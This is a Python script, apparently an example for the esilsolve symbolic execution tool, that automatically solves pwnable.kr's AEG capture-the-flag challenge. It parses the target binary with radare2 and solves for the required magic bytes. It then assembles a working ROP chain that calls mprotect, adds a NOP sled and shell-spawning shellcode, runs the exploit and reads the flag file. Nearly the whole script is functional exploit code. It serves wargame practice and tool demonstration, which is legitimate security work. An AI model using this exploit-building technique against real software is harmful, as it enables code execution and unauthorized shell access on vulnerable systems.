#!/usr/bin/env python
# solve aeg on pwnable.kr with esilsolve
# its faster than manticore and angr
# so thats cool

from esilsolve import ESILSolver
import esilsolve.solver as solver

from subprocess import check_output
import time
from pwn import *
import r2pipe

context.arch = 'amd64'

path = "tests/aeg_program"
r2p = None

def esilsolve_execution(targets):
    log.info("Starting esilsolve execution...")
    start = time.time()

    r2p.cmd("s %d; aei; aeim;" % targets["check_start"])
    esilsolver = ESILSolver(r2p, debug=False, trace=False)
    state = esilsolver.init_state()

    buf_addr = targets["buf_addr"]
    buf_len = 48
    b = [solver.BitVec("b%d" % x, 8) for x in range(buf_len)]
    buf = solver.Concat(*b)

    state.memory[buf_addr] = buf

    def constrain_jump(instr, newstate):
        # never take jumps for failed solutions
        newstate.solver.add(newstate.registers["zf"] == 1) 

    for jne_addr in targets["jnes"]:
        esilsolver.register_hook(jne_addr, constrain_jump)

    final = esilsolver.run(targets["goal"], avoid=[targets["check_start"]+39])
    
    if final.solver.check() == solver.sat:
        end = time.time()
        log.info("EXEC TIME: %f" % (end-start))

        return list(solver.BV2Bytes(final.evaluate(buf)))
    else:
        return []

def generate_exploit(magic, targets, elf):

    addr = targets["buf_addr"]
    last_mov = targets["last_mov"]
    xors = targets["xors"]

    log.info('Crafting final exploit')

    r = ROP(elf)
    shellcode = asm(shellcraft.amd64.sh())
    
    ret = r.find_gadget(["ret"])
    pop_rdi = r.find_gadget(["pop rdi", "ret"])
    pop_rbp = r.find_gadget(["pop rbp", "ret"])
    pop_rsi = r.find_gadget(["pop rsi", "pop r15", "ret"])

    page_size = 2**12
    mask = page_size - 1
    
    #exploit calls mprotect to make the input executable and then jumps into the shellcode
    exp_str = (
        p64(ret.address)*90 +
        p64(pop_rbp.address) +
        p64(addr+48+48+91*8+4) +
        p64(ret.address)*4 +
        p64(last_mov) + 
        p32(0x7) + p64(0x0) + 
        p64(pop_rdi.address) + 
        p64(addr & ~mask) + 
        p64(pop_rsi.address) + 
        p64(0x1000) + 
        b"JUNKJUNK" + 
        p64(targets["mprotect"]) + 
        p64(addr+48+48+97*8+32) + 
        b"\x90"*64 + # nop sled
        shellcode
    )
    
    #print input.values() + magic
    #exploit = format_input(magic + list(exp_str), xors)
    exp = magic + list(exp_str)
    exploit = ""
    for i in range(len(exp)):
        exploit += "%02x" % (exp[i] ^ (xors[i % 2] & 0xff)) 

    return exploit

def download_program(f):

    line = b"" 
    while b"wait..." not in line:
        line = f.readline()

    b64program = f.readline()
    program = base64.b64decode(b64program.strip())

    progfile = open(path+".z", "wb+")
    progfile.write(program)
    progfile.close()

    subprocess.call(["uncompress", "--force", path+".z"])
    subprocess.call(["chmod", "766", path])

    log.info("Program decompressed and executable")

    #f.close()

def parse_disassembly():
    r2p.cmd("aa")
    main_instrs = r2p.cmdj("s main; pdfj")

    r2xors = []
    r2start = 0
    r2cmp = 0
    r2buf = 0

    for instr in main_instrs["ops"]:
        if "xor eax" in instr["disasm"]:
            r2xors.append(int(instr["disasm"][9:], 16))
        elif "movzx eax, byte [0x" in instr["disasm"]:
            if r2start == 0:
                r2start = instr["offset"]

            r2buf = int(instr["disasm"].split("[")[1][:-1], 16)

    r2jnes = [x["addr"] for x in r2p.cmdj("/amj jne")]
    r2goal = r2p.cmdj("pdj 1 @ sym.imp.memcpy")[0]["offset"]
    r2mprotect = r2p.cmdj("pdj 1 @ sym.imp.mprotect")[0]["offset"]
    r2movs = [x["addr"] for x in r2p.cmdj("/amj movzx edx, byte") if "- 4" in x["opstr"]]

    last_mov = 0
    for mov in r2movs:
        instrs = r2p.cmdj("pdj 60 @ %d" % mov)[1:]
        good_mov = True

        for instr in instrs:
            if "dx," in instr["disasm"]:
                good_mov = False
                break
            elif "jne" in instr["disasm"]:
                break

        if good_mov:
            last_mov = mov
            break

    r2targets = {
        "check_start": r2start,
        "buf_addr": r2buf,
        "goal": r2goal,
        "xors": r2xors,
        "jnes": r2jnes[:-1],
        "last_mov": last_mov,
        "mprotect": r2mprotect
    }

    return r2targets

if __name__ == "__main__":
    #f = remote("pwnable.kr", 9005)
    #download_program(f)
    #f.close()

    r2p = r2pipe.open(path, flags=["-2"])
    elf = ELF(path)

    targets = parse_disassembly()
    log.info("BUFFER ADDR: 0x%016x" % targets["buf_addr"])

    magic = esilsolve_execution(targets)
    log.info("MAGIC: %s" % magic)

    exploit = generate_exploit(magic, targets, elf)
    log.info("EXPLOIT: %s" % exploit)

    #exit()

    x = process([path, exploit])
    x.read()
    #time.sleep(0.1)
    x.writeline("cat tests/flag")
    log.info("FLAG: %s" % x.read().decode())

    '''f.read()
    f.writeline(exploit)
    f.writeline("cat flag")
    log.info("FLAG: %s" % f.read().decode())
    #f.interactive()
    f.close()'''